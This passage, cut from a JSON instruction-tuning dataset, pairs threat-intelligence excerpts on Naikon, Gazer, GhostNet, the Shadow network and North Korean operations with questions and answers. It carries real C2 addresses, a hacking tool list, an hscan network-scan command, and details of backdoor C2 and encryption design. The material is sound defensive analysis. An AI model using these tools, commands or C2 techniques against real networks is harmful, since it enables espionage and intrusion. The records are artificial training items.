and \"Msn Talk.lnk\" for persistence.\nMedium Headline: Sys10\nYet another backdoor was used throughout 2013 by Naikon. Several of the C2 domains are shared with either Naikon or MsnMM infrastructure. This backdoor is a very basic initial component. To give an idea of the sophistication of its development, one of the decryption schemes it uses is an xor 0x1 loop on the very beginning of its .data\u00a0section to decrypt its C2 domain. In this case, 6C 6C 6A 62 66 2F 74\u00a068 62 71\u00a02F\u00a06F 64 75 01 (lljbf/thbq/odu) \uf0e0 mmkcg.uicp.net.\nThis weak level of encryption is odd, because other strings, like the unicode version of the callback url \"s.y.s.t.e.n.&.c.p.=.%.s.&.l.o.g.=.%.s.&.i.n.d.e.x.=.%.d.\", are maintained in plaintext in the .rdata section. Perhaps the authors thought xor'ing the domains would hide their infrastructure for as long as needed, or they were working with others who didn't understand automated sandboxes and tracing but didn't want the dns strings present in the binary. It doesn't seem to make sense, but it appears to have been effective enough to leave in the executables.\nFor all of the \"Sys10\" backdoors, URL parameters were used consistently for the initial C2 callback:\nsysten&cp=&log=&index=\nThe backdoor collects several bits of identifying information to send to the C2:\n\u2022 computer name\n\u2022 account name of logged-in user\n\u2022 group name of logged-in user\n\u2022 local IP address\n\u2022 OS versioning information\n\u2022 OS install date\nThe backdoor maintains a simple set of primitives:\n\u2022 http-based communications with hardcoded C2\n\u2022 download additional components\n\u2022 start a new process\n\u2022 terminate a running process\n\u2022 find files and copy them\n\u2022 delete files\n\u2022 create files\nWe detected this backdoor on multiple victim workstations with the following verdicts:\nTrojan.Win32.Agentb.hyb\nTrojan.Win32.Agentb.iqj\nBackdoor.Win32.MsnMM.p\nUDS:DangerousObject.Multi.Generic\nTrojan.Win32.Agentb.jwp\nAccording to KSN (Kaspersky Security Network) data, almost all of the victims attacked with this backdoor are based in Myanmar, or were Myanmar delegates travelling through the other countries like the US, for example. Some of the victims were located in Vietnam and Singapore. Victim profiles range from global political representatives and local IT service companies, to government ministries controlling media and news content, university students, and local law enforcement agencies.\nBig Headline: SECOND STAGE TOOLS\nMost of the Naikon APT's second stage tools detected on victim networks are publicly-available. Some are very common system administration tools and utilities, and some are less publicly-available custom written scanners and tools available through Chinese hacking forums. Their ability to move through networks undisturbed appears to have matured over time, demonstrating that they are a seasoned team:\n\u2022 Windows system utilities: ftp.exe, systeminfo.exe, ipconfig, net view, ping, netstat -ano, net use, quser, tasklist, netsh interface ip, netsh interface show, netsh advfirewall firewall, reg export, AT\n\u2022 Sysinternals: procmon.exe, tcpview.exe, procexep.exe, psexec\n\u2022 Prosolve: winscan.exe\n\u2022 Rarlabs: rar.exe\n\u2022 Other: procex.exe, nc.exe, xscan.exe, winscanx.exe, hscan120.rar package (includes mysql.exe and sqlcmd.exe), cutfile.exe, tftp.exe, Win7 elevation of privilege and UAC bypass, ReadPSW.exe (password stealer)\nThe Naikon APT frequently used a custom backdoor that appears to be an HDoor variant, based on old \"Honker Union\" code like \"hscan v120\". For example, once on a victim network, one of the first steps is to run the hdoor -hbs scan to identify target local network hosts. Alternatively, it may show up on victim networks and be run with a long list of parameters:\n\"lms.dat -hscan 192.168.0.1-192.168.0.254 /a\"\nBig Headline: CUSTOM HDOOR\nThe Naikon APT's custom-built HDoor tool is a robust reconnaissance tool for lateral movement, supporting the identification of, interfacing with and attacking of multiple technologies and resources:\n\u2022 host, user, group, and related authentication resources and cracking/brute forcing capabilities\n\u2022 network asset scanning and identification, including SQL database, embedded network devices like home or SMB routers, and other common network services\n\u2022 fake service listener to sniff traffic\n\u2022 disk wiping \u2013 safe delete with multiple overwrites\n\u2022 process management\n\u2022 local filetime modifier\n\u2022 SQL administration toolset\n\u2022 SOCKS5 proxy service\n\u2022 banner-based scanner\n\u2022 AV killer\nPublicly-available hd.exe (40138f3db14e6e137f8d0bdcbb5851d8), as posted by NCPH:\nThe corresponding hbs.txt output file content that is sometimes left behind on victim systems:\nThe operator's scanning is somewhat inconsistent. They will scan for a specific set of ports that include 21,22,80,3389,1433,3306, and 389. Sometimes, they add 139 and 445 to the end of that list. Often, they check for a \"PortString\", or banner, which is output to a txt file:\n[10.1.1.2 ]: Port 22 Open!!! SSH-1.99-Cisco-1.25\n[10.1.1.3 ]: Port 21 Open!!! 220-FileZilla Server version 0.9.41 beta\n[10.1.1.4 ]: Port 21 Open!!! 220 Lexmark X860de FTP Server NP.APS.N332a ready.\n[10.1.1.5 ]: Port 22 Open!!! SSH-2.0-OpenSSH_5.8\n[10.1.1.6 ]: Port 22 Open!!! SSH-2.0-dropbear_0.48\n[10.1.1.7 ]: Port 21 Open!!! 220 Service ready for new user\n[10.1.1.8 ]: Port 21 Open!!! 220 Microsoft FTP Service (Version 5.0).\n[10.1.1.8 ]: Port 80 Open!!!\n[10.1.1.8 ]: Port 3389 Open!!!\n[10.1.1.8 ]: Port 139 Open!!!\n[10.1.1.9 ]: Port 21 Open!!! 220 fima FTP server (SunOS 5.8) ready.\n[10.1.1.10 ]: Port 21 Open!!! 220 (vsFTPd 2.0.5)\n[10.1.1.13 ]: Port 21 Open!!! 220 EthernetBoard OkiLAN 8100e Ver 02.15 FTP server.\n[10.1.1.15 ]: Port 22 Open!!! SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1\n[10.1.1.21 ]: Port 80 Open!!! http://10.1.1.21/cgi-bin/webproc Dlink WIRELESS AP\nBig Headline: TARGET AND VICTIM PROFILES\nTarget profiles included high profile government and military agencies around the South China Sea:\n\u2022 Law enforcement\n\u2022 Government \u2013 executive, administrative, regulatory\n\u2022 Military \u2013 operations centers\n\u2022 Economic administration\n\u2022 State media\n\u2022 Public/Private energy\n\u2022 Shared Victims with Cycldek and Comparing Lateral Movement with Cycldek\nThe Cycldek APT appeared to follow an operational script across victim systems. It created or used c:\\intel on the victim hard disk to unpack tools and compress/ archive stolen victim files and data with Winrar, like \"c:\\intel\\1.rar\". Some of these victim systems were occupied by both the Cycldec and Naikon attackers.\nThe Cycldek attackers maintained this c:\\intel directory and its subdirectories as a sort of staging point. This mirrors what we have seen with Naikon directory setup on some victims.\n\u2022 a set of subdirectories\n\u2022 stolen files for exfiltration\n\u2022 operational logs\n\u2022 process logs\n\u2022 Cycldek tools and their config files\nThe Naikon APT and Cycldek APT also share a common attraction to Honker Union codebase.\n\nHow does the Naikon APT's custom HDoor tool facilitate reconnaissance and lateral movement within victim networks? What specific capabilities does this tool provide?",
    "output": "The Naikon APT's custom HDoor tool is a robust reconnaissance tool designed for lateral movement within victim networks. It supports a wide range of functionalities, including host, user, and group identification, network asset scanning, fake service listeners to sniff traffic, disk wiping with multiple overwrites, process management, local filetime modification, SQL administration, SOCKS5 proxy service, banner-based scanning, and AV killing. The tool scans for specific ports such as 21, 22, 80, 3389, 1433, 3306, and 389, and sometimes includes 139 and 445. It outputs the results to a text file, providing detailed information about open ports and services. This comprehensive set of capabilities allows the Naikon APT to effectively identify and exploit vulnerabilities within victim networks, facilitating their lateral movement and data exfiltration efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Encryption\nExcept for resources 101 and 102 which are RSA keys, every resource is compressed with BZip  and encrypted with 3DES.\n[RSAEncryptedBlob][SignatureBlob][3DESBlob]\n\u2022 RSAEncryptedBlob: The first 1024 bits of the data is a blob that contains a 3DES key. This blob is encrypted using RSA and can be decrypted using resource 101.\n\u2022 SignatureBlob: The second part of the data is a blob of 1024 bits containing the signature  of the last part of the data once decrypted.\n\u2022 3DESBlob: The last part is the effective data, which is encrypted with the 3DES key from  the first blob.\nEach resource is decrypted on the fly; the signature is compared with the decrypted data to check  the integrity. Decrypted resources that pass this integrity check are encrypted with a new RSA key generated randomly by the orchestrator code. The private key and the encrypted resource are then stored in the registry under a specific GUID subkey.\nSmall Headline: Communication Initialization\nIf a proxy server exists, it is retrieved and used by Gazer to make the HTTP requests. There are two different methods used to retrieve this value, either by requesting the following registry key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nor through the function InternetQueryOption with the flag INTERNET_OPTION_PROXY if the proxy server cannot be retrieved through the registry.\nThe system user agent is then set up:\n\u2022 the default value of the \"HKCU\\Software\\Microsoft\\Windows\\Current Version\\ Internet Settings\\User Agent\" key is retrieved;\n\u2022 the value keys under \"HKLM\\Software\\Microsoft\\Windows\\Current Version\\Internet Settings\\5.0\\User Agent\\Post Platform\" are enumerated and those that contain the sub-string \"IEAK\" are concatenated with the user agent string from the previous step;\n\u2022 in the case that no user agent was found in the registry, the hardcoded UA Mozilla/4.0 (compatible; MSIE 6.0) is used\nBefore attempting any contact with the C&C server, the internet connection is checked by trying  to reach the following servers one by one until one returns a HTTP status code 200:\n\u2022 update.microsoft.com\n\u2022 microsoft.com\n\u2022 windowsupdate.microsoft.com\n\u2022 yahoo.com\n\u2022 google.com\nSmall Headline: C&C server communication\nThe malware communicates with its C&C server to retrieve tasks (through HTTP GET requests)  and to send the tasks results (through HTTP POST requests).\nBefore sending a request to the C&C, the command CMC_GIVE_SETTINGS is sent to the orchestrator through its communication channel (a named pipe, more on this in the next section). The message (MSG) contained in the packet in this case is a single byte set by the orchestrator for the command result status.\nThe orchestrator replies on the same channel with the settings retrieved from the working directory with the object id, the list of the C&C servers and the last connection date.\nA GET request is performed to retrieve a task from the C&C.\nThe parameters of the GET request are chosen from amongst a hardcoded list of keywords that does  not look suspicious. Their values are generated randomly in the charset [a-z0-9] with a random size from a range given for each parameter:\n\u2022 id [6-12] (As with all other parameters, if this parameter is used in the request, it will have a random value (of letters and digits) with a random size between 6 and 12 characters.)\n\u2022 hash [10-15]\n\u2022 session [10-15]\n\u2022 photo [6-10]\n\u2022 video [6-10]\n\u2022 album [6-10]\n\u2022 client [5-10]\n\u2022 key [5-10]\n\u2022 account [6-12]\n\u2022 member [6-12]\n\u2022 partners [5-10]\n\u2022 adm [6-12]\n\u2022 author [6-12]\n\u2022 contact [6-12]\n\u2022 content [6-12]\n\u2022 user [6-12]\nHere are few examples of such requests:\nxxx.php?album=2ildzq&key=hdr2a&partners=d2lic33f&session=nurvxd2x0z8bztz&video =sg508tujm&photo=4d4idgkxxx.php?photo=he29zms5fc&user=hvbc2a&author=xvfj5r0q 9c&client=7mvvc&partners=t4mgmuy&adm=lo3r6v4xxx.php?member=ectwzo820&contact =2qwi15&album=f1qzoxuef4&session=x0z8bztz8hrs65f&id=t3x0ftu9xxx.php?partners =ha9hz9sn12&hash=5740kptk3acmu&album=uef4nm5d&session=dpeb67ip65f&member=arj6 x3ljjxxx.php?video=nfqsz570&client=28c7lu2&partners=818eguh70&contact=ibj3xch &content=1udm9t799ixr&session=5fjjt61qred9uo\nA timeout of 10 minutes is set for each request (send/receive/connect) through InternetSetOption.\nOnce the request is sent, the response is handled only if the returned HTTP status code is 404. The content of the response is encrypted and can be decrypted with the private RSA key generated by the orchestrator. The response body contains a blob of data and an MD5 hash of the data. The blob is hashed and compared to the MD5 to ensure the integrity of the server's response.\nIf the response size is 20 bytes (a blob of 4 bytes + the hash), there are no tasks to retrieve.\nA command CMC_TAKE_TASK is sent to the orchestrator with the encrypted task received from the C&C server and its size. The orchestrator will be in charge of executing the task and will send the results to the communication module. Once the blob of the tasks results (encrypted by the orchestrator) is received, it is sent to the C&C server through a POST request in the same way  that it was done for the GET request (using parameters with random values).\nMedium Headline: Messages between components\nA global named pipe is used for the communication between the different components. The data sent through this named pipe is formatted in the following way:\n\u2022 DATATYPE: the same constants are used for the resources (check the File Format entry in the \"Resources section\")\n\u2022 ID_CMD: the command name (check below for a complete list)\n\u2022 MSG: the data to be sent\nHere is a listing of the different commands:\n\u2022 CMC_TAKE_TASK (ID_CMD: 1)\n\u2022 When a task is retrieved by the C&C server module, it is sent to the orchestrator, which stores the task in the task queue.\n\u2022 CMC_TAKE_LOADER_BODY (ID_CMD: 2)\n\u2022 Wipe Gazer's original loader file, clean persistency and set up a copy of the loader  and its persistency according to one of the resources (check persistency part for details).\n\u2022 CMC_GIVE_RESULT (ID_CMD: 4)\n\u2022 When this message is received, the orchestrator will retrieve the task's result from  the result queue, compress and encrypt it using the server's public RSA key (the one  from the resource 102) and send the blob to the communication module which will send the whole result to the server through a POST request.\n\u2022 CMC_GIVE_SETTINGS (ID_CMD: 5)\n\u2022 The communication module sends this message to the orchestrator to request  the information needed to contact the server (list of the servers to contact, the last connection time and the victim ID).\n\u2022 CMC_TAKE_CONFIRM_RESULT (ID_CMD: 6)\n\u2022 When the communication module sends a task's result to the server, a message is sent  to the orchestrator that will remove the task's result from the queue.\n\u2022 CMC_TAKE_CAN_NOT_WORK (ID_CMD: 7)\n\u2022 When an operation has failed (for example, if the communication module cannot correctly parse the data received from the orchestrator), this message is sent to the orchestrator with the last error code. The error code will be added to the logfile.\n\u2022 CMC_TAKE_UNINSTALL (ID_CMD: 8)\n\u2022 Used to wipe a file from the disk.\n\u2022 CMC_TAKE_NOP (ID_CMD: 9)\n\u2022 No operation\n\u2022 CMC_NO_CONNECT_TO_GAZER (ID_CMD: 0xA)\n\u2022 This command is sent to the orchestrator when the communication module cannot contact any of the servers. In this case, if a pending task's results are in the queue, they are stored encrypted in Gazer's storage.\n\u2022 CMC_TAKE_LAST_CONNECTION (ID_CMD: 0xB)\n\u2022 This command is sent from the communication module to the orchestrator each time a connection is established to the C&C server. It contains a structure SystemTime (filled with the current system time). Once the message is received by the orchestrator, the last connection date is stored compressed and encrypted in the Gazer storage  (either the registry or ADS).\n\u2022 CMC_GIVE_CACHE / CMC_TAKE_CACHE (ID_CMD: 0xC / 0xD)\n\u2022 Not implemented\n\nAnswer this question based on the above context: How does the Gazer backdoor ensure the integrity of its resources after decryption, and what steps are taken to secure these resources further?",
    "output": "The Gazer backdoor ensures the integrity of its resources by comparing the signature of the decrypted data with the actual decrypted data. Each resource is initially encrypted with 3DES and compressed with BZip. The first 1024 bits of the data contain an RSA-encrypted blob with a 3DES key, followed by a 1024-bit signature blob. The effective data is encrypted with the 3DES key from the first blob. After decryption, the signature is verified against the decrypted data. If the integrity check passes, the decrypted resources are re-encrypted with a new RSA key generated randomly by the orchestrator code. The private key and the encrypted resource are then stored in the registry under a specific GUID subkey.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How can IT departments minimize the risks associated with Java and unwanted software installations within their environment?",
    "output": "To minimize risks associated with Java and unwanted software, IT departments can identify business dependencies on Java and develop a plan to minimize its use where it is not needed. Using AppLocker to block the installation and use of unwanted software such as Java or peer-to-peer (P2P) applications is an effective strategy. AppLocker allows administrators to control which applications and files users can run, helping to prevent unauthorized software from being installed or executed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Recorded Future Blog\nby Insikt Group on June 15, 2017\nIntent is critical to comprehending North Korean cyber activity.\nUnderstanding North Korean national objectives, state organizations, and military strategy are key to, and often (<https://www.wired.com/2014/12/sony-north-korea-hack-experts-disagree/>)missing from, discussions about attributing North Korean cyber activity. Frequently, , cyber security professionals, and describe North Korean leaders or their respective actions as \"crazy,\" \"erratic,\" or \"not rational.\" This is not the case. When examined through the lens of North Korean military strategy, national goals, and security perceptions, cyber activities correspond to their larger approach.\nRecorded Future research reveals that North Korean cyber actors are not crazy or irrational: they just have a wider operational scope than most other intelligence services.\nThis scope comprises a broad range of criminal and terrorist activity, including illegal drug manufacturing and selling, counterfeit currency production, bombings, assassination attempts, and more. The National Security Agency (NSA) (<https://www.washingtonpost.com/world/national-security/the-nsa-has-linked-the-wannacry-computer-worm-to-north-korea/2017/06/14/101395a2-508e-11e7-be25-3a519335381c_story.html?hpid=hp_hp-more-top-stories_northkoreacyber744pm%3Ahomepage%2Fstory&utm_term=.c7e1181476fd>)has attributed the April (<https://www.recordedfuture.com/wannacry-ransomware-analysis/>)WannaCry ransomware attacks to North Korea's intelligence service, the Reconnaissance General Bureau (RGB). We assess that use of ransomware to raise funds for the state would fall under both North Korea's asymmetric military strategy and \"self-financing\" policy, and be within the broad operational remit of their intelligence services.\nBig Headline: Analysis\nDigging into some of these past North Korean activities is important to add context to the cyber operations we have tracked since 2009. North Korea's engagement in a wide range of criminal and terrorist activities is part of its broad national strategy, which employs asymmetric operations and surprise attacks to overcome North Korea's (<http://ssi.armywarcollege.edu/pubs/parameters/Articles/97spring/jablonsk.htm>)conventional national power deficit.\nAccording to an interview with a former U.S. State Department official, and (<https://www.cnas.org/people/david-asher>)North Korea expert, in (<http://www.vanityfair.com/style/2009/09/office-39-200909>)Vanity Fair, \"crime, in other words, has become an integral part of North Korea's economy. 'It not only pays, it plays to their strategy of undermining Western interests.1'\"\nIt is critical to place North Korea's criminal and cyber activity in the context of its larger military and national security strategies which support (<https://ssi.armywarcollege.edu/pdffiles/PUB771.pdf>)two primary objectives:\n1. Perpetuation of the Kim regime,\n2. Unification of the Korean peninsula under North Korean leadership.\nA 2016 (<https://jsis.washington.edu/news/north-korea-cyber-attacks-new-asymmetrical-military-strategy/>)University of Washington study succinctly summarizes North Korea's asymmetric military strategy:\nSince the end of the Korean War, North Korea has developed an asymmetric military strategy, weapons, and strength because its conventional military power is far weaker than that of the U.S. and South Korea. Thus, North Korea has developed three military strategic pillars: surprise attack; quick decisive war; mixed tactics. First, its surprise attack strategy refers to attacking the enemy at an unexpected time and place. Second, its quick decisive war strategy is to defeat the South Korean military before the U.S. military or international community could intervene. Lastly, its mixed tactics strategy is to use multiple tactics at the same time to achieve its strategic goal.\nDespite their near-constant tirade of (<https://kcnawatch.co/search/?q=United+States>)bellicose rhetoric and professions of strength, North Korea fundamentally views the world from a position of weakness, and has developed a national strategy that utilizes its comparative strengths \u2014 complete control over a population of (<https://www.cia.gov/library/publications/the-world-factbook/geos/kn.html>)25 million people and unflinching, amoral devotion to the Kim hereditary dynasty.\nIn this context, criminality, terrorism, and destructive cyber attacks all fit within the North Korean asymmetric military strategy which emphasizes surprise attacks and mixed tactics. The criminality and cyber attacks also have the added bonus of enabling North Korea to undermine the very international economic and political systems that\nconstrain and punish it.\nEvidence is mounting that (<https://www.treasury.gov/resource-center/sanctions/Programs/Pages/nkorea.aspx>)sanctions, (<https://www.treasury.gov/resource-center/sanctions/Programs/Documents/2321.pdf>)international pressure, and (<https://www.cfr.org/backgrounder/china-north-korea-relationship>)possibly increased enforcement by China are (<http://freekorea.us/2016/06/28/n-korean-counterfeiting-surges-as-bureau-39s-checks-bounce/#sthash.2YDy2cs3.dpbs>)beginning to take their toll on the North Korean economy and in particular, North Korea intelligence agent's ability to procure goods for regime leadership. A from the concluded that North Korea's black market had helped the nation endure the impacts of the international sanctions last year.\nDetailed below are numerous non-cyber operations that have been conducted by the predecessor organizations of the RGB. The violence, destruction, and criminal breadth of these operations reveal the broad operational scope of these intelligence services and the context in which they are conducted.\nThis data further reveals a history of denials by North Korea of responsibility for operations dating back to the 1960s, putting into context the current leadership's denials of cyber operations.\nBig Headline: \"Blue House Raid\"\nOne of the first major attacks on South Korea since the (<https://www.archives.gov/historical-docs/todays-doc/?dod-date=727>)armistice was declared after the Korean War in 1953 occurred in 1968. The so-called \"(<https://www.nknews.org/2013/01/when-nk-commandos-tried-to-assassinate-south-koreas-president/>)Blue House Raid\" was an assassination attempt on then-President Park Chung Hee by 31 North Korean special operations soldiers on the night of January 20, 1968. The 31 North Korean soldiers crossed the DeMilitarized Zone (DMZ) on foot and managed to get within a half mile of the President's residence (the so-called \"Blue House\") before being exposed. Upon discovery the North Korean soldiers engaged in a series of firefights with South Korean forces; (<https://nkmonitor.wordpress.com/2008/01/21/remembering-the-blue-house-raid/>)68 South Koreans and three U.S. soldiers were killed. Most of the North Korean soldiers were killed in the eight days after the raid; two made it back across the DMZ and one was captured.\nA captured North Korean soldier after the Blue House Raid. ((<https://archive.org/details/BlueHoweRaid1968>)Source)\nBig Headline: 1983 Rangoon Bombing\nOn October 9, 1983, (<http://www.time.com/time/magazine/article/0,9171,952196,00.html>)three North Korean soldiers attempted to assassinate then-South Korean President Chun Doo Hwan while on a trip to Myanmar. A (<http://english.yna.co.kr/Engnews/20060223/480100000020060223092719E9.html>)bomb at a mausoleum the President was scheduled to visit detonated early, (<http://oai.dtic.mil/oai/oai?verb=getRecord&metadataPrefix=html&identifier=ADA461685>)killing 21 people, including the Korean Foreign Minister and Deputy Prime Minister.\nDuring the (<http://www.upi.com/Archives/1983/12/09/North-Koreans-sentenced-to-death-for-Burmese-bombing/4439439794000/>)trial for the bombers, (<https://www.washingtonpost.com/archive/politics/1983/12/03/north-korean-leaders-son-blamed-for-rangoon-bombing/ddec34cc-9c12-4fc6-bf75-36057091aa4e/?utm_term=.29ddcb686467>)testimony revealed that the North Korean agents used a North Korean trading vessel to travel to Myanmar and the home of a North Korean diplomat to prepare the bombs. In a (<https://www.cia.gov/library/readingroom/docs/DOC_0000408056.pdf>)classified report (report was declassified in 2000) ten days after the bombing, CIA analysts laid out a strong case that North Korea was responsible for the attack despite (<http://www.upi.com/Archives/1983/10/12/More-than-1-million-mourners-summoned-by-the-wail/2380434779200/>)official denials of involvement from the official North Korean news agency. North Korean state media even (<http://archives.chicagotribune.com/1983/10/13/page/29/article/a-million-koreans-mourn-bomb-victims>)accused President Chun of using the attack to increase tensions on the peninsula.\nSouth Korean officials wait at the mausoleum in Rangoon minutes before the bomb detonated. ((<http://english.chosun.com/site/data/html_dir/2007/04/25/2007042561013.html>)Source)\nQuestion: How does the Blue House Raid of 1968 exemplify North Korea's asymmetric military strategy, and what insights does it provide into the operational scope of North Korean intelligence services?",
    "output": "Answer: The Blue House Raid of 1968 exemplifies North Korea's asymmetric military strategy by demonstrating its willingness to conduct surprise attacks and engage in mixed tactics to achieve its strategic goals. The raid, which involved 31 North Korean special operations soldiers attempting to assassinate then-President Park Chung Hee, showcases the bold and aggressive nature of North Korea's military actions. This event provides insights into the operational scope of North Korean intelligence services, revealing their capability to plan and execute high-risk operations that involve significant violence and destruction. Additionally, the raid highlights North Korea's history of denying responsibility for its actions, a pattern that continues in its cyber operations today.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Tibetan Government-in-Exile (TGIE)\nOn September 11, 2008, Wireshark was used to capture packets from a TGIE computer xxxxxxx. An analysis revealed that this computer was compromised by malware which sent communication to, and received communication from, control servers.\nThe malware made connections to a control server on 221.10.254.248 using the host name 927. bigwww.com. The IP address 221.10.254.248 is assigned to CNCGROUP-SC (CNC Group CHINA169 Sichuan Province Network) in China. The malware on the infected computer used HTTP to connect to a JPEG file, which was not an image file but instead contains an IP address and port number (124.135.97.21:8005). This IP address, 124.135.97.21, is assigned to CNCGROUP-SD (CNC Group CHINA169 Shandong Province Network) in China.\nVery Small Headline: London\nOn October 1, 2008 Wireshark was used to capture packets from a computer in the London OOT. An analysis revealed that this computer was compromised by malware which sent communication to, and received communication from, control servers.\nThe malware made connections to a control server on 58.141.132.66 using the hostname oyd.3322. org on port 4501. The IP address 58.141.132.66 is assigned to NamBu TV in Seoul, South Korea. 3322. org is a Chinese dynamic domain service.\nVery Small Headline: New York\nOn March 3, 2008, Wireshark was used to capture packets from a computer in the New York OOT. An analysis revealed that this computer was compromised by malware which attempted to send communication to a control server.\nThe malware attempted to make a connection to what appears to be a control server at 125.108.172.81 but there was not an active server at that location. The IP address 125.108.172.81 is assigned to CHINANET-ZJ-WZ (CHINANET-ZJ Wenzhou node network) in China.\nRead the text above and answer this question: In the GhostNet APT campaign, how did the malware on the compromised computer in the Tibetan Government-in-Exile (TGIE) communicate with its control servers, and what were the specific details of these communications?",
    "output": "The malware on the compromised computer in the Tibetan Government-in-Exile (TGIE) communicated with its control servers using HTTP protocol. Specifically, it connected to a control server on the IP address 221.10.254.248, which is assigned to CNCGROUP-SC (CNC Group CHINA169 Sichuan Province Network) in China, using the host name 927.bigwww.com. The malware retrieved a JPEG file from this server, which was not an actual image but contained an embedded IP address and port number (124.135.97.21:8005). This secondary IP address, 124.135.97.21, is assigned to CNCGROUP-SD (CNC Group CHINA169 Shandong Province Network) in China.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 5.1.2 Patriotic Hacking\nThe PRC has a vibrant hacker community that has been tied to targeted attacks in the past, and has been linked through informal channels to elements of the Chinese state, although the nature and extent of the connections remains unclear. One common theme regarding attribution relating to attacks emerging from the PRC concerns variations of a privateering model, in which the state authorizes private persons to perform attacks against enemies of the state. This model emerged because studies have shown that there is no direct government control over the loosely connected groups of hackers in the PRC (Henderson 2007b). Even within the privateering approach there is much dispute regarding the exact relationship. The degrees of the reported relationship vary between \"authorize\" to \"tacit consent\" to \"tolerate\" (Henderson 2007b).\nHowever, this ambiguous relationship does not mean that there is no connection between the activities of Chinese hackers and the state. The PRC's intelligence collection is based on the gathering of bits of information across a broad range of sources:\nChina relies on a broad informal network of students, tourists, teachers, and foreign workers inside of host nations to collect small bits of information to form a composite picture of the environment. Rather than set a targeted goal for collection, they instead rely on sheer weight of information to form a clear understanding of the situation. (Henderson 2007b)\nAs a result, information that is independently obtained by the Chinese hacker community is likely to find its way to elements within the Chinese state. However, the Chinese state is not monolithic. It is a complex entity that includes cooperation and competition amoung a variety of entities, including the Communist Party, the PLA and the Government of China. In addition, within each of those entities there are factions and rivalries. Further complicating matters is that there are reported relationships between the edges of the government and networks of organized crime in the PRC, as in many other countries (Bakken 2005; Keith and Lin 2005). These complex relationships further complicate our understanding of the connections between the Chinese hacker community and the Chinese state.\nWhile the PLA is developing computer network operations (CNO), as are the armed forces of a wide variety of countries, its relationship with the hacker community appears to be minimal, as a recent study reports:\nLittle evidence exists in open sources to establish firm ties between the PLA and China's hacker community, however, research did uncover limited cases of apparent collaboration between more elite individual hackers and the PRC's civilian security services. The caveat to this is that amplifying details are extremely limited and these relationships are difficult to corroborate. (Northrop Grumman 2009)\nMoreover, the same study found that there is nothing that \"suggests that the PLA or state security bureaus intend to use hacktivist attacks as a component of a CNO campaign\" (Northrop Grumman 2009). In addition, there are a variety of factors, such as the lack of command and control, precision targeting and the inability to maintain surprise and deception, that argue against the use of non-state hackers as part of the PLA's CNO strategy.\nIn fact, the relations between the hacker community and the state is more likely to be a concern of the Ministry of Public Security (Northrop Grumman 2009; Henderson 2007b). Interestingly, the Ministry of Public Security has focused primarily on internal security matters, which links with the emphasis on the Tibet-related targets documented in this report. (the PRC views Tibet as an internal problem.)\nMedium Headline: 5.2.2 Cyber Crime\nThe activity of cyber criminals in the PRC parallels the activities of cyber criminals around the globe. The Chinese hacker community has been known to engage in criminal activities, primarily motivated by profit. Acting independently of state direction, they are involved in the buying and selling of malware, theft of intellectual property, theft of gaming credentials, fraud, blackmail, music and video piracy, and pornography (Henderson 2007b). This activity is complex and further obfuscated by the move of Eastern European-based criminal networks into Chinese cyberspace (Vass 2007). Researchers have identified several core components of the cyber crime ecosystem in the PRC:\n\u2462 Malware Authors  \u2013 motivated by profit and/or stature within the blackhat community, malware authors leverage their technical skills to create and distribute exploits (including 0day vulnerabilities) as well as trojan horse programs. Their services are often advertised on discussion forums.\n\u2462 Website Masters/Crackers  \u2013 by maintaining malicious websites, exploiting vulnerable websites and providing hosting for the command and control capabilities of trojans, the website masters/crackers provide the infrastructure for cybercrime in the PRC\n\u2462 \"Envelopes\" Stealers \u2013 focus on acquiring username and password pairs, known as envelopes, through the use of malware kits, which are then sold. They operate and maintain networks of infected computers but purchase services from malware authors and website masters/crackers to compensate for their general lack of technical skill.\n\u2462 Virtual Asset Stealers/Sellers  \u2013 by exploiting their knowledge of the underground economy, virtual asset stealers/sellers purchase compromised credentials from envelopes stealers and sell virtual assets to online games players, QQ users and others who drive the demand for stolen virtual goods (Choo 2008; Thibodeau 2010; Zhuge et al. 2009).\nIn additional to politically sensitive information, we did find that personal information, including banking information, was exfiltrated by the attackers. It is possible that in addition to exploiting the politically sensitive information the attacks may have also had an interest in exploiting the financial data that was stolen although we have no direct knowledge of such events occurring.\nMedium Headline: 5.2.3 Overall Assessment\nAttribution concerning cyber espionage networks is a complex task, given the inherently obscure modus operandi of the agents or groups under investigation. Cyber criminals aim to mask their identities, and the networks investigated in this report are dispersed across multiple platforms and national jurisdictions. Complicating matters further is the politicization of attribution questions, particularly concerning Chinese inten-\ntions around information warfare. Clearly this investigation and our analysis tracks back directly to the PRC, and to known entities within the criminal underground of the PRC. There is also an obvious correlation to be drawn between the victims, the nature of the documents stolen, and the strategic interests of the Chinese state. But correlations do not equal causation. It is certainly possible that the attackers were directed in some manner \u2014 either by sub-contract or privateering \u2014 by agents of the Chinese state, but we have no evidence to prove that assertion. It is also possible that the agents behind the Shadow network are operating for motives other than political espionage, as our investigation and analysis only uncovered a slice of what is undoubtedly a larger set of networks. Even more remote, but still at least within the realm of possibility, is the false flag scenario, that another government altogether is masking a political espionage operation to appear as if it is coming from within the PRC.\nDrawing these different scenarios and alternative explanations together, the most plausible explanation, and the one supported by the evidence, is that the Shadow network is based out of the PRC by one or more individuals with strong connections to the Chinese criminal underground. Given the often murky relationships that can exist between this underground and elements of the state, the information collected by the Shadow network may end up in the possession of some entity of the Chinese government.\n\nAnswer this question based on the above context: How does the PLA's relationship with the hacker community differ from that of the Ministry of Public Security in the context of cyber operations? What factors argue against the use of non-state hackers in the PLA's CNO strategy?",
    "output": "The PLA's relationship with the hacker community appears to be minimal, with little evidence of firm ties. Research suggests that the PLA does not intend to use hacktivist attacks as part of its CNO campaign, due to factors such as the lack of command and control, precision targeting, and the inability to maintain surprise and deception. In contrast, the Ministry of Public Security is more concerned with the hacker community, focusing primarily on internal security matters, which aligns with the emphasis on Tibet-related targets documented in the report. The PRC views Tibet as an internal problem, highlighting the Ministry of Public Security's role in monitoring and addressing domestic issues related to cyber activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
